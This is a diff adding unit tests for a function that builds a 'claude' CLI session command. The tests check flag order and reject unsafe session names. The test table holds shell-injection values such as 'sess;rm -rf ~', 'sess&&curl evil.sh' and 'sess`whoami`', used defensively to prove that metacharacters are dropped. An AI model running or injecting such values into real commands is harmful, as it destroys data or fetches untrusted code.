@@ -489,6 +489,82 @@ describe('the task stage', () => {
   });
 });
 
+describe('sessionCommand identity flags (HIVE-61)', () => {
+  const UUID = '00000000-0000-4000-8000-000000000000';
+
+  it('names the session and pins its id', () => {
+    expect(sessionCommand('claude', { name: 'sess-01', sessionUuid: UUID })).toBe(
+      `claude --name sess-01 --session-id ${UUID} && exit`,
+    );
+  });
+
+  it('passes a settings path for the hook pipeline', () => {
+    expect(
+      sessionCommand('claude', { settingsPath: '/Users/x/Library/hive/hooks.json' }),
+    ).toBe('claude --settings /Users/x/Library/hive/hooks.json && exit');
+  });
+
+  it('keeps the flags in a stable order alongside model and effort', () => {
+    expect(
+      sessionCommand('claude', {
+        model: 'opus',
+        effort: 'high',
+        name: 'sess-01',
+        sessionUuid: UUID,
+      }),
+    ).toBe(`claude --model opus --effort high --name sess-01 --session-id ${UUID} && exit`);
+  });
+
+  it.each([
+    ['a space', 'sess 01'],
+    ['a semicolon', 'sess;rm -rf ~'],
+    ['a backtick', 'sess`whoami`'],
+    ['a dollar', 'sess$HOME'],
+    ['an ampersand', 'sess&&curl evil.sh'],
+    ['a quote', "sess'x"],
+    ['a double quote', 'sess"x'],
+    ['a pipe', 'sess|sh'],
+    ['a newline', 'sess\nrm -rf ~'],
+    ['a backslash', 'sess\\x'],
+    ['an empty string', ''],
+  ])('drops a name containing %s rather than escaping it', (_label, name) => {
+    /**
+     * The security property. `--name` is interpolated into a string a login
+     * shell parses, and unlike `--model`/`--effort` it has no closed list behind
+     * it — so the reasoning that justifies leaving those unquoted does not reach
+     * this one. A name that fails the pattern omits the **flag**, which starts
+     * the session unnamed: exactly what it did before this story, and never a
+     * command line with a shell metacharacter in it.
+     */
+    const command = sessionCommand('claude', { name });
+
+    expect(command).toBe('claude && exit');
+    expect(command).not.toContain('--name');
+  });
+
+  it('drops a name past the length cap', () => {
+    expect(sessionCommand('claude', { name: 'a'.repeat(65) })).toBe('claude && exit');
+  });
+
+  it('accepts the ids the app actually generates', () => {
+    // `sess-01`, and the fixture ids that reach this path on first open.
+    for (const name of ['sess-01', 'sess-a1', 'hero-refresh', 'lead-form']) {
+      expect(sessionCommand('claude', { name })).toBe(`claude --name ${name} && exit`);
+    }
+  });
+
+  it('drops a session id that is not a uuid', () => {
+    /**
+     * A malformed value makes `claude` exit non-zero, and `&&` turns that into
+     * "the session opened and did nothing" — the hardest failure to diagnose
+     * from the outside.
+     */
+    expect(sessionCommand('claude', { sessionUuid: 'not-a-uuid' })).toBe(
+      'claude && exit',
+    );
+  });
+});
+
 describe('sessionCommand', () => {
   it('exits the shell after a clean claude exit', () => {
     /**
